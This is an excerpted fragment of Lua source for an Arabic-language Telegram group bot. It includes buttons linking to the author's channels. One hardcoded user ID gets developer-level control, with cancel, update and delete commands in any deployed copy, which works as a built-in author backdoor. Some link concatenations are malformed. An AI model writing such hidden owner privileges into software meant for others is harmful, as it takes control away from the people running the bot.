...
chsource = Redis:get(Fast..'chsource') or "@yousef_labban"
devsource = Redis:get(Fast..'devsource') or "yousef_labban"
devsource2 = Redis:get(Fast..'devsource') or "yousef_labban"
function var(value)  
...
ControllerAll = false
local ListSudos = {Sudo_Id,874820580,874820580,874820580}
...
if text == 'كانسل' and tonumber(senderr) == tonumber(874820580) then
...
if text == 'ابديت' and tonumber(senderr) == tonumber(874820580) then
...
if tonumber(senderr) == 874820580 then
msg.Name_Controller = 'مطـور السـورس  '
msg.The_Controller = 1
elseif tonumber(senderr) == 874820580 then
msg.Name_Controller = 'مطـور السـورس  '
msg.The_Controller = 1
elseif tonumber(senderr) == 874820580 then
msg.Name_Controller = 'مطـور السـورس  '
...
if text and text:match('^حذف (%d+)$') and tonumber(senderr) == tonumber(874820580) then
...
if text == 'محمدو' or text == 'مجاني' or text == 'محمد'  then
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = 'Dev', url = 't.me/Yousef_Labban'}, 
},
}
}
return send(msg_chat_id,msg_id,"[rino](tg://user?id=874820580)","md",true, false, false, true, reply_markup)
end
if text == 'مصنع السورس' or text == 'المصنع' or text == 'مصنع'  then
  ...
  data = {
  {
  {text = 'Source FREE', url = 'https://t.me/Yousef_Labban1'}, 
  },
  }
  }
  return send(msg_chat_id,msg_id,"[Source FREE](https://t.me/Yousef_Labban1)","md",true, false, false, true, reply_markup)
  end
if text == "صورتي" then
...
if (text:match('(.*)سي في(.*)') or text:match('(.*)محمدي(.*)') or text == "سي في") then
local Message_Reply = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
...
if text and text:match("^ss (.*)$") and tonumber(senderr) == tonumber(874820580) then
local txx = "\n"
...
bot.sendAudio(msg_chat_id,msg_id,'./intk'..rand..'.mp3',tostring(inoi),"html",nil,tostring(inoi),"@yousef_labban")
sleep(1)
...
data = {
{
{text = 'الشروحات', url = 't.me/Yousef_Labban1'..devsource},{text = 'لتنصيب بوت', url = 't.me/Yousef_Labban'..devsource2},  
},
{
{text = 'سورس مجاني', url = 'http://t.me/Yousef_Labban1'..chsource..''}, 
},
{
},
}
